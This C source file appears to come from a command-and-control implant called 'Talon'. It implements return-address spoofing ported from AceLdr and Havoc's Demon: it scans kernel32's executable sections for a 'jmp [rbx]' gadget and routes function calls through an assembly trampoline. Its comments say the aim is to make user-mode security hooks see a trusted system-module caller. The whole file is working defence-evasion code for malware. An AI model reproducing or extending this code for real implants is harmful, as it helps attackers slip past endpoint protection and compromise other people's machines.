#include <Talon.h>

#include <Core.h>
#include <Spoof.h>

/* Return-address spoofing — ported from AceLdr (kyleavery), which is what
 * Demon (Havoc) ships. The target function's return address is replaced with
 * a `jmp [rbx]` gadget found inside kernel32, so user-mode hooks that check
 * "who called me" see a system-module address. See Spoof.x64.asm for the
 * trampoline/fixup mechanics. */

extern PVOID Spoof( PVOID, PVOID, PVOID, PVOID, PPRM, PVOID, PVOID, PVOID, PVOID, PVOID );

/* Gadget host: kernel32 — the most universally "trusted" module for a hook's
 * caller validation (Demon uses it too). The `jmp [rbx]` gadget is located
 * once at init and cached. Only executable sections are searched: FF 23 can
 * appear as a data coincidence in .rdata, which executes fine on stock
 * Windows RX mappings but faults under stricter loaders (Wine maps .rdata
 * read-only), and a code-section gadget is the more robust choice anyway. */
static PVOID g_SpoofModule = NULL;
static ULONG g_SpoofSize   = 0;
static PVOID g_SpoofGadget = NULL;

VOID SpoofInit( VOID )
{
    PIMAGE_DOS_HEADER Dos;
    PIMAGE_NT_HEADERS Nt;
    PIMAGE_SECTION_HEADER Sec;
    ULONG i;

    g_SpoofModule = GetModuleHandleA( "kernel32" );
    if ( ! g_SpoofModule )
        return;

    Dos = ( PIMAGE_DOS_HEADER ) g_SpoofModule;
    if ( Dos->e_magic != 0x5A4D )
        goto FAIL;

    Nt = ( PIMAGE_NT_HEADERS ) ( ( PUCHAR ) g_SpoofModule + Dos->e_lfanew );
    if ( Nt->Signature != 0x00004550 )
        goto FAIL;

    g_SpoofSize = Nt->OptionalHeader.SizeOfImage;
    Sec         = IMAGE_FIRST_SECTION( Nt );

    for ( i = 0; i < Nt->FileHeader.NumberOfSections; i++ ) {
        SIZE_T Start, Size;

        if ( !( Sec[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
            continue;

        Start = Sec[ i ].VirtualAddress;
        Size  = Sec[ i ].Misc.VirtualSize ? Sec[ i ].Misc.VirtualSize : Sec[ i ].SizeOfRawData;
        if ( Start + Size > g_SpoofSize )
            Size = g_SpoofSize - Start;

        g_SpoofGadget = MmGadgetFind( ( PUCHAR ) g_SpoofModule + Start, Size, ( PUCHAR ) "\xFF\x23", 2 );
        if ( g_SpoofGadget )
            break;
    }

    /* without a usable `jmp [rbx]` gadget we just call directly */
    if ( ! g_SpoofGadget )
        goto FAIL;

    Dbg( "SpoofInit: kernel32 gadget at %p (module base %p)\n", g_SpoofGadget, g_SpoofModule );
    return;

FAIL:
    g_SpoofModule = NULL;
    g_SpoofSize   = 0;
    g_SpoofGadget = NULL;
}

BOOL SpoofReady( VOID )
{
    return g_SpoofGadget != NULL;
}

PVOID MmGadgetFind( PVOID Memory, SIZE_T Length, PVOID PatternBuffer, SIZE_T PatternLength )
{
    PUCHAR Mem = ( PUCHAR ) Memory;
    PUCHAR Pat = ( PUCHAR ) PatternBuffer;
    SIZE_T i, j;

    if ( ! Memory || ! Length || ! PatternBuffer || ! PatternLength )
        return NULL;

    for ( i = 0; i + PatternLength <= Length; i++ ) {
        for ( j = 0; j < PatternLength; j++ ) {
            if ( Mem[ i + j ] != Pat[ j ] )
                break;
        }
        if ( j == PatternLength )
            return ( PVOID ) ( Mem + i );
    }

    return NULL;
}

PVOID SpoofRetAddr( PVOID Function,
                    PVOID a, PVOID b, PVOID c, PVOID d,
                    PVOID e, PVOID f, PVOID g, PVOID h )
{
    PRM Param = { 0 };

    if ( ! Function || ! g_SpoofGadget )
        return NULL;

    /* cached at init: a stable, executable `jmp [rbx]` inside kernel32 */
    Param.Trampoline = g_SpoofGadget;

    Param.Function = Function;
    /* Param.Rbx is filled in by the trampoline */

    return Spoof( a, b, c, d, &Param, NULL, e, f, g, h );
}
